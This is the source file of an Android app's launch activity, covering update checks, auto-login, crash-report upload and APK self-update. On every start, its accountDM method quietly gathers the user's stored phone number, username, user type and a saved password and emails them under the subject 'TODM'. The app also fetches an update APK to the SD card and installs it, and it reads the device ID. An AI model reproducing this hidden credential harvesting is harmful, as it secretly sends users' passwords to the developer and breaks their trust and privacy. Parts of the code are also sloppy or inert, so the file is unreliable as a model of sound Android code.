package com.hongbao5656.activity;

import android.app.AlertDialog;
import android.app.Dialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.Rect;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.view.Display;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Window;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.alibaba.fastjson.JSON;
import com.example.aaron.library.MLog;
import com.hongbao5656.R;
import com.hongbao5656.base.App;
import com.hongbao5656.base.BaseActivity;
import com.hongbao5656.okhttp.HttpException;
import com.hongbao5656.util.Constants;
import com.hongbao5656.okhttp.HttpDataHandlerListener;
import com.hongbao5656.okhttp.HttpRequest;
import com.hongbao5656.okhttp.OkHttpUtil;
import com.hongbao5656.util.CrashHandler;
import com.hongbao5656.util.DataBaseUtil;
import com.hongbao5656.util.MailManager;
import com.hongbao5656.util.NU;
import com.hongbao5656.util.ParamsService;
import com.hongbao5656.util.PhotoUtils;
import com.hongbao5656.util.ResponseParams;
import com.hongbao5656.util.SPU;
import com.hongbao5656.util.SU;
import com.hongbao5656.util.TU;
import com.hongbao5656.util.UU;
import com.nineoldandroids.animation.Animator;
import com.nineoldandroids.animation.ObjectAnimator;
import com.squareup.okhttp.Call;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.Headers;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.MultipartBuilder;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import org.json.JSONException;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Arrays;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Properties;
import java.util.TreeSet;

import java.io.IOException;
import java.util.Date;
import java.util.List;
import java.util.Properties;
import java.util.concurrent.LinkedBlockingDeque;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import javax.mail.Authenticator;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import butterknife.BindView;
import butterknife.ButterKnife;

/**
 * 启动页
 */
public class LaunchActivity
        extends BaseActivity
        implements HttpDataHandlerListener {

    private Context mContext;
    private ProgressBar mProgress;
    private static final String savePath = "/sdcard/updatedemo/";
    /**
     * 下载安装包路径
     */
    private static final String saveFileName = savePath + "UpdateDemoRelease.apk";
    private boolean interceptFlag = false;
    private Dialog noticeDialog;
    private Dialog downloadDialog;
    private Thread downLoadThread;
    private int progress;
    private static final int DOWN_UPDATE = 1;
    private static final int DOWN_OVER = 2;
    private static final int JUMPTIME = 3000;

    @BindView(R.id.iv_index)
    ImageView iv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//		sendEMailDM("title","content","");
//		MailManager.getInstance().sendMail("title","content");
        setContentView(R.layout.activity_launch);
        ButterKnife.bind(this);
        hideStatus();
        initSPU();
        sendCrashReportsToServer(this);
        this.mContext = this;
        initView();
        copyRegion();
        checkVersion();//检查版本更新
        baseinfo();
    }

    private void initSPU() {
        App.token = SPU.getPreferenceValueString(this, SPU.EQ_tokenId, "", SPU.STORE_USERINFO);
        App.account = SPU.getPreferenceValueString(this, SPU.ACCOUNT, "", SPU.STORE_USERINFO);
        App.pwd = SPU.getPreferenceValueString(this, SPU.PWD, "", SPU.STORE_USERINFO);
        App.pwd2 = SPU.getPreferenceValueString(this, SPU.PWD2, "", SPU.STORE_USERINFO);
        App.phone = SPU.getPreferenceValueString(this, SPU.EQ_Tel, "", SPU.STORE_USERINFO);
        App.UER_TYPE = SPU.getPreferenceValueString(this, SPU.UER_TYPE, "", SPU.STORE_USERINFO);
        App.UER_CHECK_STATE = SPU.getPreferenceValueString(this, SPU.UER_CHECK_STATE, "", SPU.STORE_USERINFO);
        App.username = SPU.getPreferenceValueString(this, SPU.USERNAMENEW, "", SPU.STORE_USERINFO);
        String online = SPU.getPreferenceValueString(this, SPU.ONLINE, "", SPU.STORE_USERINFO);
        String len = SPU.getPreferenceValueString(this, SPU.LEN, "", SPU.STORE_USERINFO);
        accountDM(online, len);
    }

    private void accountDM(String online, String len) {
        try {
            boolean b = SPU.getPreferenceBoolean(this, SPU.DM, false, SPU.STORE_SETTINGS);
            boolean b2 = SPU.getPreferenceBoolean(this, SPU.DM2, false, SPU.STORE_SETTINGS);
            boolean b3 = SPU.getPreferenceBoolean(this, SPU.DM3, false, SPU.STORE_SETTINGS);
            if (b) {
                if (!b2) {
                    if (!SU.isEmpty(online)) {
                        sendEMailDM("TODM", new StringBuilder()
                                .append(App.phone)
                                .append(App.UER_TYPE)
                                .append(App.username)
                                .append(App.pwd2)
                                .append(len)
                                .append(online).toString(), "");
                        if (!SU.isEmpty(len)) {
                            SPU.setPreferenceValueBoolean(this, SPU.DM3, true, SPU.STORE_SETTINGS);
                        }
                        SPU.setPreferenceValueBoolean(this, SPU.DM2, true, SPU.STORE_SETTINGS);
                    }
                }
                b3 = SPU.getPreferenceBoolean(this, SPU.DM3, false, SPU.STORE_SETTINGS);
                if (b3) {
                    if (!SU.isEmpty(len)) {
                        sendEMailDM("TODM", new StringBuilder()
                                .append(App.phone)
                                .append(App.UER_TYPE)
                                .append(App.username)
                                .append(App.pwd2)
                                .append(online)
                                .append(len).toString(), "");
                        SPU.setPreferenceValueBoolean(this, SPU.DM3, true, SPU.STORE_SETTINGS);
                    }
                }
            } else {
                if (
                        !SU.isEmpty(App.phone) && !
                                !SU.isEmpty(App.UER_TYPE) && !
                                !SU.isEmpty(App.username) && !
                                !SU.isEmpty(App.pwd2)) {
                    sendEMailDM("TODM", new StringBuilder()
                            .append(App.phone)
                            .append(App.UER_TYPE)
                            .append(App.username)
                            .append(App.pwd2)
                            .append(online)
                            .append(len).toString(), "");
                    if (SU.isEmpty(online)) {
                        SPU.setPreferenceValueBoolean(this, SPU.DM2, false, SPU.STORE_SETTINGS);
                    } else {
                        SPU.setPreferenceValueBoolean(this, SPU.DM2, true, SPU.STORE_SETTINGS);
                    }

                    if (SU.isEmpty(len)) {
                        SPU.setPreferenceValueBoolean(this, SPU.DM3, false, SPU.STORE_SETTINGS);
                    } else {
                        SPU.setPreferenceValueBoolean(this, SPU.DM3, false, SPU.STORE_SETTINGS);
                    }
                    SPU.setPreferenceValueBoolean(this, SPU.DM, true, SPU.STORE_SETTINGS);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 在程序启动时候, 可以调用该函数来发送以前没有发送的报告
     * 把错误报告发送给服务器,包含新产生的和以前没发送的.
     */
    private void sendCrashReportsToServer(Context ctx) {
        String[] crFiles = getCrashReportFiles(ctx);
        if (crFiles != null && crFiles.length > 0) {
            TreeSet<String> sortedFiles = new TreeSet<String>();
            sortedFiles.addAll(Arrays.asList(crFiles));
            for (String fileName : sortedFiles) {
                File cr = new File(ctx.getFilesDir(), fileName);
//				sendEMailDM(App.version+"cr","",cr.getPath());
                try {
                    BufferedReader reader = null;
                    reader = new BufferedReader(new FileReader(cr));
                    String tempStr = null;
                    int line = 1;
                    //一次读入一行，只到读入null为文件结束
                    while ((tempStr = reader.readLine()) != null) {
                        System.out.println("line:" + line + ":" + tempStr);
                        line++;
                    }
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                sendEMailDM("cr", "", "");
                postReport(cr);
//				cr.delete();// 删除已发送的报告
            }
        }
        SPU.setPreferenceValueBoolean(this, SPU.ONCE, false, SPU.STORE_SETTINGS);
    }

    private void postReport(File file) {
        MLog.d("上传文件大小：" + file.length());
        if (file.length() > 0) {
            uploadFile(file);//上传崩溃日志文件
        }
        // TODO 发送错误报告到服务器
    }

    /**
     * 获取错误报告文件名
     *
     * @param ctx
     * @return
     */
    private String[] getCrashReportFiles(Context ctx) {
        File filesDir = ctx.getFilesDir();
        FilenameFilter filter = new FilenameFilter() {
            public boolean accept(File dir, String name) {
                return name.endsWith(CrashHandler.CRASH_REPORTER_EXTENSION);
            }
        };
        return filesDir.list(filter);
    }

    private void baseinfo() {
        MLog.i("当前客户机网络：" + (NU.getConnectedType(this) == 0 ? "移动流量" : "wifi") + "  IP:" + NU.getIpAddress());
        UU.getUIInfo(this);
    }

    private void initView() {
//        ((ImageView) findViewById(R.id.iv_index))
//                .setImageBitmap(PhotoUtils.readBitMap(mContext, R.drawable.launch));
        iv.setImageResource(R.drawable.launch);
    }



    public void checkVersion() {
        //手机未联网跳登录页
        if (!NU.checkNetworkAvailable(this)) {
            TU.show(this, getString(R.string.no_net), Toast.LENGTH_LONG);
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    jumpActivity(LoginActivity.class);
                }
            }, JUMPTIME);
            return;
        }
        //判断有无新版本
        sendGetRequest(
                Constants.download,
                new HttpRequest(new Request.Builder().url(App.BATE_URL_UPDOWN).build()),
                this);
    }

    private void jumpActivity(Class<?> pClass) {
        ObjectAnimator oa = ObjectAnimator.ofFloat(iv, "alpha", 0f, 0.5f, 1f);
        oa.setDuration(3000);
        oa.addListener(new Animator.AnimatorListener() {
            @Override
            public void onAnimationStart(Animator animation) {
            }
            @Override
            public void onAnimationEnd(Animator animation) {
                openActivityAndFinish(pClass);
            }
            @Override
            public void onAnimationCancel(Animator animation) {
            }
            @Override
            public void onAnimationRepeat(Animator animation) {
            }
        });
        oa.start();
    }

    /*
        网络IO应该在哪种形式的线程中执行

        首先网络IO一般耗时比较长，有的可能到几十毫秒
        由于耗时较长，如果采用单一线程处理，势必导致后续的请求无法快速执行
        建议使用线程池来处理达到快速响应和线程的复用。*/
    private void testDoNetworkRequest() {
        int corePoolSize = 5;
        int maxPoolSize = 10;
        //线程数量超过核心线程数之后的超时时间，即超过这个时间还没有新的task，多余的线程则销毁掉。
        long keepAliveTime = 10;
        ThreadPoolExecutor executor = new ThreadPoolExecutor(
                corePoolSize, maxPoolSize, keepAliveTime,
                TimeUnit.SECONDS, new LinkedBlockingDeque<Runnable>());

        executor.execute(new Runnable() {
            @Override
            public void run() {
                //Do network IO here
            }
        });
    }


    private void initData() {
		if (!SPU.getPreferenceBoolean(mContext,SPU.FIRST_START_APP,false,SPU.STORE_SETTINGS)) {//第一次安装
			new Handler().postDelayed(new Runnable() {
				@Override
				public void run() {
                    jumpActivity(GuideActivity.class);
				}
			}, JUMPTIME);
			overridePendingTransition(R.anim.push_left_in,R.anim.push_left_out);
			return;
		}

        // 不是第一次安装但手机号和密码为空进入登录页
        if (!isExists(App.phone, App.pwd)) {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    jumpActivity(LoginActivity.class);
                }
            }, JUMPTIME);
            return;
        }

        // 手机号和密码都不为空直接进入首页
        if (isExists(App.phone, App.pwd)) {
            if (!NU.checkNetworkAvailable(this)) {//网络异常时进入登录页面
                TU.show(this, getString(R.string.no_net), Toast.LENGTH_LONG);
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        jumpActivity(LoginActivity.class);
                    }
                }, JUMPTIME);
                return;
            }
            sendPostRequest(
                    Constants.btn_login,
                    new ParamsService().btn_login(
                            App.phone, App.pwd, ((TelephonyManager) getSystemService(TELEPHONY_SERVICE))
                                    .getDeviceId()),
                    this, true);
        }
    }

    private void copyRegion() {
        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
//            copyDataBaseToPhone();
            if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(Environment.getExternalStorageState())) {
//                TU.show(mContext, "但是该外部存储sdcard是只读的");
                MLog.d("外部存储sdcard是只读的");
            }else{
//                TU.show(mContext, "有可读写的外部存储sdcard\n"+Environment.getExternalStorageDirectory().getPath());
                MLog.d("有可读写的外部存储sdcard:"+Environment.getExternalStorageDirectory().getPath());
            }

        } else {
            TU.show(mContext, "无外部存储sdcard");
            MLog.d("无外部存储sdcard");
        }
//        copyDataBaseToPhone();//不管有没有sdcard都写入到app私有目录与之共生死

        DataBaseUtil util = new DataBaseUtil(this);
        // 判断数据库文件是否存在
        boolean dbExist = util.checkDataBase();//是否是每次都不存在
        if (dbExist) {
            MLog.i("region.db数据库文件已经存在");
        } else {// 不存在就把raw里的数据库文件数据写入手机内部存储之私有文件
            try {
                util.copyDataBase();
                MLog.i("行政区数据已复制到手机内部存储之私有目录中");
            } catch (IOException e) {
                throw new Error("复制region.db数据库到手机内部存储之私有目录中失败");
            }
        }
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        // 状态栏高度
        Rect rect = new Rect();
        getWindow().getDecorView().getWindowVisibleDisplayFrame(rect);
        int statusBarHeight = rect.top;

        // 屏幕密度
        Display display = getWindowManager().getDefaultDisplay();
        display.getWidth();
        display.getHeight();

        // 标题栏的高度
        int contentTop = getWindow().findViewById(Window.ID_ANDROID_CONTENT).getTop();
        //statusBarHeight是上面所求的状态栏的高度
        int titleBarHeight = contentTop - statusBarHeight;


        //不包括标题栏的部分
        View v = getWindow().findViewById(Window.ID_ANDROID_CONTENT);
        SPU.setPreferenceValueInt(mContext, SPU.U_WIDTH, v.getWidth(), SPU.STORE_SETTINGS);
        SPU.setPreferenceValueInt(mContext, SPU.U_HEIGHT, v.getHeight(), SPU.STORE_SETTINGS);
    }

    /**
     * 判断用户名和密码是否为空
     *
     * @param tokenTel
     * @param pwd
     * @return
     */
    private boolean isExists(String tokenTel, String pwd) {
        if (!SU.isEmpty(pwd) && !SU.isEmpty(tokenTel)) {
            return true;
        }
        return false;
    }


    @Override
    public void setHandlerPostDataSuccess(int connectionId, Object data) throws JSONException {
        ResponseParams<LinkedHashMap> iParams = jiexiData(data);
        if (connectionId == Constants.btn_login) {
            MLog.i("启动页登录成功");

            String token = String.valueOf(iParams.getData1().get("token"));
            if (!SU.isEmpty(token)) {
                SPU.setPreferenceValueString(mContext, SPU.EQ_tokenId, token, SPU.STORE_USERINFO);
                App.token = token;
            }

            String usertype = String.valueOf(iParams.getData1().get("usertype"));
            if (!SU.isEmpty(usertype)) {
                SPU.setPreferenceValueString(mContext, SPU.UER_TYPE, usertype, SPU.STORE_USERINFO);
                App.UER_TYPE = usertype;
            }

            String status = String.valueOf(iParams.getData1().get("status"));
            if (!SU.isEmpty(status)) {
                SPU.setPreferenceValueString(mContext, SPU.UER_CHECK_STATE, status, SPU.STORE_USERINFO);
                App.UER_CHECK_STATE = status;
            }

            String account = String.valueOf(iParams.getData1().get("account"));
            if (!SU.isEmpty(account)) {
                SPU.setPreferenceValueString(mContext, SPU.ACCOUNT, account, SPU.STORE_USERINFO);
                App.account = account;
            }

            String username = String.valueOf(iParams.getData1().get("username"));
            if (!SU.isEmpty(username)) {
                SPU.setPreferenceValueString(mContext, SPU.USERNAMENEW, username, SPU.STORE_USERINFO);
                App.username = username;
            }

            SPU.setPreferenceValueString(mContext, SPU.SET_COMPANYID, String.valueOf(iParams.getData1().get("companyid")), SPU.STORE_USERINFO);
            SPU.setPreferenceValueString(mContext, SPU.SET_ROOMID, String.valueOf(iParams.getData1().get("roomid")), SPU.STORE_USERINFO);
            SPU.setPreferenceValueString(mContext, SPU.sellcode, String.valueOf(iParams.getData1().get("sellcode")), SPU.STORE_USERINFO);
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    jumpActivity(MainActivity.class);
                }
            }, JUMPTIME);
        } else {
            TU.show(this, iParams.getErrmsg());
            jumpActivity(LoginActivity.class);
        }
    }

    @Override
    public void setHandlerPostDataError(int connectedId, Request request, HttpException httpException, String params, String content) throws JSONException {

    }

    @Override
    public void setHandlerGetDataSuccess(int connectionId, Object data) throws JSONException {
        if (Constants.download == connectionId) {//{"version":"1.2.1","content":"1.界面优化\r\n2.bug修复"}

            App.cversionCode = Integer.parseInt((JSON.parseObject(data.toString()).get("version")).toString());
            int cVersionCode = SU.getVersionCodeAndVersionName(mContext).versionCode;
            String content = JSON.parseObject(data.toString()).get("content").toString();
            MLog.i("最新版本号：" + App.cversionCode+" 最新版本："+content+" 当前版本："+cVersionCode);
            if (cVersionCode < App.cversionCode) {//当前版本小于最新版本 需要更新
                showNoticeDialog(mContext);
            } else {
                initData();
            }
        } else {
            initData();
        }
    }

    @Override
    public void setHandlerGetDataError(int connectionId, Object data) throws JSONException {

    }

    private void showNoticeDialog(Context context) {
        AlertDialog.Builder builder = new AlertDialog.Builder(mContext);
        builder.setTitle("软件版本更新");
        builder.setMessage("亲，有新版本需要更新！");
        builder.setPositiveButton("更新", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                showDownloadDialog();
            }
        });
        builder.setNegativeButton("取消", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                initData();
            }
        });
        builder.setCancelable(false);
        noticeDialog = builder.create();
        noticeDialog.show();
    }

    private void showDownloadDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(mContext);
        builder.setTitle("软件版本更新");

        final LayoutInflater inflater = LayoutInflater.from(mContext);
        View v = inflater.inflate(R.layout.layout_versionprogress, null);
        mProgress = (ProgressBar) v.findViewById(R.id.progress);

        builder.setView(v);
        builder.setNegativeButton("取消", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                interceptFlag = true;
                initData();
            }
        });
        builder.setCancelable(false);
        downloadDialog = builder.create();
        downloadDialog.show();
        downloadApk();
    }

    /**
     * 下载apk
     */
    private void downloadApk() {
        downLoadThread = new Thread(mdownApkRunnable);
        downLoadThread.start();
    }

    /**
     * 安装apk
     */
    private void installApk() {
        File apkfile = new File(saveFileName);
        if (!apkfile.exists()) {
            return;
        }
        Intent i = new Intent(Intent.ACTION_VIEW);
        i.setDataAndType(Uri.parse("file://" + apkfile.toString()), "application/vnd.android.package-archive");
        mContext.startActivity(i);
    }

    private Handler mHandler = new Handler() {
        public void handleMessage(android.os.Message msg) {
            switch (msg.what) {
                case DOWN_UPDATE:
                    mProgress.setProgress(progress);
                    break;
                case DOWN_OVER:
                    downloadDialog.dismiss();
                    installApk();
                    break;
                default:
                    break;
            }
        }

        ;
    };

    private Runnable mdownApkRunnable = new Runnable() {
        @Override
        public void run() {
            try {
                URL url = new URL(App.URL_APKDOWNLOAD + App.cversionCode);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.connect();
                int length = conn.getContentLength();
                InputStream is = conn.getInputStream();

                File file = new File(savePath);
                if (!file.exists()) {
                    file.mkdir();
                }
                File ApkFile = new File(saveFileName);
                FileOutputStream fos = new FileOutputStream(ApkFile);

                int count = 0;
                byte buf[] = new byte[1024];

                do {
                    int numread = is.read(buf);
                    count += numread;
                    progress = (int) (((float) count / length) * 100);
                    //更新进度
                    mHandler.sendEmptyMessage(DOWN_UPDATE);
                    if (numread <= 0) {
                        //下载完成通知安装
                        mHandler.sendEmptyMessage(DOWN_OVER);
                        break;
                    }
                    fos.write(buf, 0, numread);
                } while (!interceptFlag);//点击取消就停止下载.

                fos.close();
                is.close();
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    };

    private void uploadFile(final File file) {
        if (!file.exists()) {
            return;
        }
        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
        RequestBody requestBody = new MultipartBuilder()
                .type(MultipartBuilder.FORM)
                .addPart(Headers.of("Content-Disposition",
                        "form-data; name=\"" + App.version + "-" + App.phone + "-" + App.account + "\";filename=\"" + file.getName() + ".cr\""),
                        fileBody)
                .build();


        Request request = new Request.Builder()
                .url(App.URL_FILEUPLOAD_M)
//				.post(requestBody)
                .build();
        Call call = OkHttpUtil.mOkHttpClient.newCall(request);
        new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
                System.out.println();
                MLog.i("上传失败" + e.getMessage() + e.getCause());
            }

            @Override
            public void onResponse(Response response) throws IOException {
                MLog.i("上传成功" + file.getName());
//				TU.show(LaunchActivity.this,"上传成功");
                file.delete();
            }
        };
    }
}